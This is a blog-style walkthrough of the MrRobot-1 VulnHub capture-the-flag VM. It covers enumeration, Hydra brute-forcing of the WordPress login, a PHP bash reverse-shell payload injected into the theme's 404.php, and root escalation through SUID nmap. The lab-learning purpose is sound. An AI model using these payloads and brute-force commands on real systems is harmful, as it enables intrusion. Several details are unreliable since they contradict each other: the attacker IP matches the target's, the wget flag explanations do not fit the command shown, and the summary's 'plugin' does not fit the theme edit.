---
title: "MrRobot-1 VulnHub Challenge – Full Walkthrough"
date: 2024-01-12
draft: false
summary: "A full penetration test walkthrough of the MrRobot-1 VM from VulnHub, including network setup, enumeration, brute force login with Hydra, exploitation via reverse shell, privilege escalation, and root flag discovery."
---

# MrRobot-1 VulnHub Challenge: A Complete Walkthrough

## Introduction

 I came across the MrRobot-1 on Vulnhub, and chose to have a closer look, due to its beginner-to-intermediate difficulty and clear objectives: find three hidden keys within the VM. The story, inspired by the TV series _Mr. Robot_, promised straightforward enumeration and exploitation without deep reverse-engineering. I began the exercise at 10 AM on Thursday, January 11, 2024, and wrapped it up around 11 AM the next day, spending roughly nine hours experimenting, researching, and documenting.  

## Verifying the VM and Ensuring File Integrity

Downloading community-provided VM images can be risky, so I always verify checksums before importing. After grabbing the `MrRobot-1.ova` and its MD5/SHA1 hashes, I restored the file flagged and quarantined by Windows Defender. A quick hash comparison confirmed the download’s integrity.  
![File integrity](/images/mrrobot1/1.jpg)

With the checksums matching VulnHub’s published values, I imported the OVA into VirtualBox. It’s best practice to dedicate a separate host-only or internal network for penetration tests to prevent accidental leaks and keep target systems isolated.

## Networking and DHCP Setup

I configured both my Kali and the MrRobot-1 VM on a VirtualBox internal network. At first, no DHCP server was present, so the Kali VM lacked an IP address. After locating `VBoxManage`’s DHCP management section, I created a new DHCP range (10.0.0.2–10.0.0.254) on the `vboxnet0` interface and restarted Kali.  

![VirtualBox network set to internal](/images/mrrobot1/2.jpg)
![Setting up a local dhcp](/images/mrrobot1/3.jpg)

With DHCP in place, Kali received 192.168.3.2, confirming network connectivity. From there, I could begin active reconnaissance against the MrRobot-1 target.

## Discovering the Target and Web Enumeration

Running a quick `netdiscover` scan on the internal subnet revealed two live hosts, my Kali VM and another at 192.168.3.3. Browsing to `http://192.168.3.3` showed a custom website with several menu items.  

![Nmap discovery for the network](/images/mrrobot1/4.jpg)

Attempting HTTPS produced the same site over port 443.  

![Browser page found hosted on the server](/images/mrrobot1/5.jpg)

A peek at the HTML source exposed numerous JavaScript files, but nothing obvious jumped out beyond styling and video embeds. I decided to focus on standard web enumeration next.

## First Key via robots.txt

Every web crawler first checks `robots.txt` for disallowed paths, and in this case, the file contained a direct link to `key-1-of-3.txt`. Retrieving it revealed:  
![First key found in robots.txt file](/images/mrrobot1/6.jpg)

Basic directory enumeration either manually from known files such as the robots.txt, or with tools like dirbuster, gives great insights before diving into more complex attacks.

## Mirroring the Site and Directory Busting

To explore the site offline and gather all available files for analysis, I mirrored the webserver recursively:

```bash
wget -r --no-parent http://192.168.3.3/
```

After the download completed, I used `grep` to search for any occurrences of the word “key” within the downloaded directory tree:

```bash
grep -Rnwo . -e 'key'
```
This command had several options working together to ensure a comprehensive download. It mirrored the webpage by recursively retrieving linked pages and their content, such as images and CSS files (with the "m" and "p" options).
The "E" option handled file extensions, while the "k" option converted links within HTML files for
local use. This approach provided a complete snapshot of the webpage, enabling a thorough examination that led to the discovery of the hidden fsocity.dic file in the robots.txt file.

Although wget is a powerful command-line tool for such tasks, alternative methods exist. Browser
extensions like "Save Page WE" (for Firefox) or "Download All Images" (for Chrome) offer a more
user-friendly approach with one-click downloads. Graphical download managers such as "Internet
Download Manager" and "Free Download Manager" provide intuitive interfaces. However, wget
remains favored for automation and complex mirroring tasks due to its command-line efficiency
and flexibility, making it essential for tasks like web scraping.

However, it became clear that not all files were retrieved by this command, specifically, neither `key-1-of-3.txt` nor `fsocity.dic` appeared in the mirrored output files, from a few greps. To access these, I navigated directly to:

http://192.168.3.3/key-1-of-3.txt

http://192.168.3.3/fsocity.dic

From these links, I downloaded the files manually. Inspecting `fsocity.dic`, I noted that it contained a large list of words (over 11,000 unique entries after sorting and de-duplicating). I extracted only the unique words to a separate file for use as a wordlist:

```bash
sort fsocity.dic | uniq > fsocity.dic.uniq
``` 

## Web Directory Enumeration

To identify any hidden or unlinked directories on the webserver, I performed directory enumeration using Nmap with the `http-enum` script:

```bash
nmap -p 80,443 --script=http-enum 192.168.3.3
```
Another option with a GUI for those who prefer that, is Dirbuster. With the latter we have an option to also add dictionaries/wordlists for a quick (relatively) scan based on most common paths. The NMAP scan revealed several potentially interesting paths:

    /admin/

    /wp-login.php

    /robots.txt

    WordPress version-related directories (e.g., /wp-content/, /wp-includes/)

    /readme.html


Next, I ran Nikto to cross-verify these findings:

```bash
    nikto -h http://192.168.3.3
```

Nikto’s output confirmed the presence of the WordPress login page at `/wp-login.php` along with other standard WordPress resources. Visiting `http://192.168.3.3/wp-login.php` in the browser displayed:

![WordPress login page](/images/mrrobot1/7.jpg)

With these directories identified, I prepared to attempt brute-forcing the WordPress login.

---

## Brute-Force Login with Hydra

### Intercepting the Login Request

To understand how WordPress handles login submissions, I used Burp Suite to capture a sample POST request when attempting to log in with test credentials. By turning on the proxy and submitting dummy data at `http://192.168.3.3/wp-login.php`, I observed the following form data structure:

![Burpsuite](/images/mrrobot1/8.jpg)

    POST /wp-login.php HTTP/1.1

    Host: 192.168.3.3
    ...
    log=<USERNAME>&pwd=<PASSWORD>&wp-submit=Log+In&redirect_to=...&testcookie=1

This confirmed the parameters needed for Hydra.

### Using Hydra to Brute-Force the Username

Because WordPress returns a distinct “Invalid username” message when a nonexistent username is entered, I first enumerated valid usernames. I instructed Hydra to use a static password (`wedontcare`) while iterating through `fsocity.dic.uniq` as potential usernames:

```bash
hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.3.3 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -o hydra_user_results.txt

Source: Tafani-Dereeper, 2017
``` 

After several minutes, Hydra identified that “elliot” (in any case variation) was a valid username. 

### Using Hydra to Brute-Force the Password

With the username “elliot” confirmed, I switched to a password-only brute-force, targeting the same login form:

```bash
hydra -vV -l elliot -P fsocity.dic.uniq 192.168.3.3 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect" -o hydra_pass_results.txt
``` 
![Password found](/images/mrrobot1/9.jpg)

Hydra found the password to be: elliot:ER28-0652

Armed with these credentials, I logged into the WordPress dashboard at `http://192.168.3.3/wp-admin/`.  

![WP Login successful](/images/mrrobot1/10.jpg)

Upon entering the dashboard, I saw that “elliot” held administrative privileges. No obvious clues for the remaining keys were visible in the admin interface itself, but I did note a subscriber account (`mich05654`) with the display name “Krista Gordon,” which could be relevant later.

---

## Exploitation via Reverse Shell Plugin

Rather than running a full WPScan (which would require internet connectivity and updating databases), I focused on a known vulnerable method: Reverse Shell, attempting to test if one could upload a PHP reverse shell payload.

**Locate a writable theme file (404.php)**  
In the Appearance → Theme Editor, I found a `404.php` file in the active theme’s directory (e.g., `/var/www/html/wp-content/themes/twentytwentyone/404.php`).

**Insert reverse shell payload**  
I edited `404.php` and added the following PHP snippet at the top, modifying the IP to my Kali VM (192.168.3.3) and choosing port 4444:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.3.3/4444 0>&1'");
?>
```


Start a netcat listener on Kali:

```bash
nc -lvnp 4444
```

![PHP code injection, having a listener active in a separate terminal](/images/mrrobot1/11.jpg)


## Trigger the payload
By visiting a non-existent page (e.g., http://192.168.3.3/nonexistentpage), WordPress returned a 404, executing our modified 404.php and providing a reverse shell:

``` 
connection from 192.168.3.3:4444 received on tty /dev/pts/1
``` 

At this point, I had a shell as www-data on the target VM:

![Reverse shell opened](/images/mrrobot1/12.jpg)

# Second Key Found (key-2-of-3.txt)

Once in the shell, I navigated to the WordPress web directory and located two files in the home directory of the “robot” user:
```bash
cd /home/robot
ls -la
key-2-of-3.txt  password.raw-md5
```
To open the key file we need to gain access to the user robot. Trying to see if the password file has a known hash-value by 
searching existing databases on a separate box connected to the internet. By a quick search, it suggested the MD5
Hash-value could be the list of letters in the english alphabet:

> abcdefghijklmnopqrstuvwxyz

Attempting to log into robot with this password revealed the limitations of the initial shell, and I
found a method from a user nwrzd (2019), to start a tty shell. From there we managed to open the
second key text-file.

![Second key](/images/mrrobot1/13.jpg)


## Gaining Root Access and Finding the Third Key

### Enumerating Sudo and SUID

As robot, I checked sudo privileges:

sudo -l

No direct sudo rights were granted to robot. Instead, I searched for any SUID binaries owned by root:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID binaries owned by root](/images/mrrobot1/14.jpg)

Among the results was `/usr/bin/nmap`, which on many older systems has an interactive mode permitting shell escapes.

### Exploiting Nmap’s Interactive Mode

I ran `nmap` in interactive mode with root privileges by taking advantage of the SUID bit:

```bash
/usr/bin/nmap --interactive
```
![Using Nmap through interactive mode, resulting in root privileges](/images/mrrobot1/15.jpg)


## Reading the Third Key

With root privileges, I searched for key-3:

```bash
find / -type f -iname 'key-3-of-3.txt' 2>/dev/null
```
![As root, searching for the third and final flag](/images/mrrobot1/16.jpg)
# Summary and Discussion

The MrRobot-1 VulnHub challenge provided a curious and practical penetration testing scenario with clear, progressively harder objectives, with some emphazis on file integrity verification and verification initially, as well as setting up a secure isolated environment so the files within the challenges can not reach the host machine, nor the internet, for the investigation. Setting up a dns server was an additional point of learning, which is always positive!


## Web Enumeration Techniques Summary

    Examine robots.txt for clues to hidden files (e.g., key-1-of-3.txt).

    Mirror the site with wget to retrieve static files for offline analysis, then use grep to locate strings like “key.” 

    Credential Harvesting with Hydra

        Brute-force usernames first (WordPress clearly differentiates “Invalid username”).

        Once a username is validated, target the password with a wordlist derived from site resources (e.g., fsocity.dic.uniq).

        Capture successful credentials and gain administrative access to WordPress.

    Exploitation via Vulnerable Plugins

        Identify and leverage a vulnerable WordPress plugin (Reverse Shell) to upload a PHP payload and obtain a reverse shell as www-data.

    Privilege Escalation

        Locate SUID binaries (e.g., nmap) that can spawn an interactive shell.

        Escalate from a limited www-data/robot user to root.

    Hidden Rewards (Three Keys)

        Key 1: Found in robots.txt.

        Key 2: Located in /home/robot/key-2-of-3.txt (requires reverse shell + TTY upgrade).

        Key 3: Stored at /root/key-3-of-3.txt (obtained via SUID nmap exploit).

Overall, this exercise reinforces the critical importance of strong password policies, diligent web enumeration, and careful privilege escalation techniques. It highlights how seemingly minor misconfigurations, an exposed robots.txt, an outdated plugin, or a SUID binary, can lead to total system compromise. Continuous learning, thorough enumeration, and methodical exploitation are essential practices for any aspiring or seasoned penetration tester.

## References

Christophe Tafani-Dereeper, 2017. [Write Up] Mr Robot. https://blog.christophetd.fr/write-up-mr-robot

ZeusCybersec, Sept. 2021. TryHackMe-Mr Robot CTF Writeup. https://sparshjazz.medium.com/tryhackme-mr-robot-ctf-writeup-d2ccad34e6b7

Nwrzd, Sept. 2019. Vulnhub.com : Mr-Robot: 1 Walkthrough. https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f

Seven Layers, 2024. WordPress Plugin: Reverse Shell. https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
